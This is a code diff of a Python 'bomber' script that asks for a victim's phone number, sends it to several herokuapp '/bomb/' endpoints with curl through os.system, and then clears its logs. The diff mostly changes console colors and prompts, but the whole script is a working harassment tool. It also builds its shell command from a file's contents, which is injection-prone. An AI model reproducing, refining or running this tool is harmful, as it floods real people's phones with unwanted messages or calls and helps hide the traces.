@@ -4,50 +4,46 @@ try:
     from colorama import *
     print('[!] Checking for Requirements')
     print(" ")
-    print(Fore.RED + 'Colorama' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'Colorama' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
 except Exception as e:
     print(e)
     print("'Colorama' was not found!")
     print("Installing colorama")
     os.system('pip install colorama')
-
+    os.system("python3 pythonbomber.py")
 try:
     import os
-    print(Fore.RED + 'os' + Fore.WHITE + '       [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'os' + Fore.WHITE + '       [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
 except Exception as e:
     print(e)
-    print(Fore.RED + "'os' was not found!")
-
-
+    print(Fore.LIGHTRED_EX + "'os' was not found!")
 try:
     import time
-    print(Fore.RED + 'time' + Fore.WHITE + '     [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'time' + Fore.WHITE + '     [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
 except Exception as e:
     print(e)
-    print(Fore.RED + "'time' was not found!")
-
+    print(Fore.LIGHTRED_EX + "'time' was not found!")
 try:
     import random
-    print(Fore.RED + 'random' + Fore.WHITE + '   [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'random' + Fore.WHITE + '   [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
 except Exception as e:
     print(e)
 try:
     import datetime
-    print(Fore.RED + 'datetime' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'datetime' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
 except Exception as e:
     print(e)
 
 input('Press enter to continue')
 os.system("clear")
 
-
 print("""
-                      :::!~!!!!!:.
-                  .xUHWH!! !!?M88WHX:.
-                .X*#M@$!!  !X!M$$$$$$WWx:.
-               :!!!!!!?H! :!$!$$$$$$$$$$8X:
-              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
-             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+                      :::!~!!!!!:.             
+                  .xUHWH!! !!?M88WHX:.            Ram Ram BHAI!!
+                .X*#M@$!!  !X!M$$$$$$WWx:.      /
+               :!!!!!!?H! :!$!$$$$$$$$$$8X:    /
+              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:  /    
+             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!     
              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                ~?WuxiW*`   `"#$$$$8!!!!??!!!
@@ -70,10 +66,10 @@ def startup_time():
     os.system('')
     print(' ')
     print(' ')
-    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + ']' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)
-print(startup_time())
+    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)    
+startup_time()
 
-number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim >_ ')
+number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim : ')
 
 server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
 server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
@@ -91,23 +87,24 @@ pair6 = [server6, server5, server4, server3, server2]
 
 pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]
 
-def bombing_time():
-    Time=datetime.datetime.now().strftime("%H:%M:%S")
-    print(Fore.GREEN + 'Bombing started at ' + Fore.RED +Time)
+Time=datetime.datetime.now().strftime("%H:%M:%S")
 
 def write_srvers():
+    print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Configuring Request...')
     f = open("serverconf.txt", "w")
     l = random.choice(pairs_lst)
     f.writelines(l)
-    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + ' Bombing from the servers -->')
-    print(Fore.WHITE + ".")
-    print(l)
+    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Started sending request at ' + Fore.LIGHTRED_EX + Time)
+   # print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Bombing from the servers -->')
+    #print(Fore.WHITE + ".")
+    #print(l)
     f.close()
 
 def read_servers():
+    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Getting Response from the servers...')
+    print(" ")
     f = open("serverconf.txt", "r")
     os.system("curl"+f.read())
-    print(" ")
     print(" ")
     print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + " Clearing logs!")
     try:
@@ -115,7 +112,6 @@ def read_servers():
         print(Fore.WHITE + "[" + Fore.GREEN + "✓" + Fore.WHITE + "] " + Fore.GREEN + "Successfully cleared logs!")
     except Exception as e:
         print("✗"+e)
-
 
 def main():
     write_srvers()
@@ -129,10 +125,10 @@ def countdown(t):
         print("[#]  "+timer, end="\r")
         time.sleep(1)
         t -= 1
-    print("Initiating Bombing Servers...")
-    bombing_time()
+    print(Fore.WHITE + '[' + Fore.LIGHTRED_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTRED_EX + ' 00:00' )
     main()
 
-t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds'(0 for NO DELAY) >_")
+t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds': ")
 print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + "Bombing in")
+
 countdown(int(t))
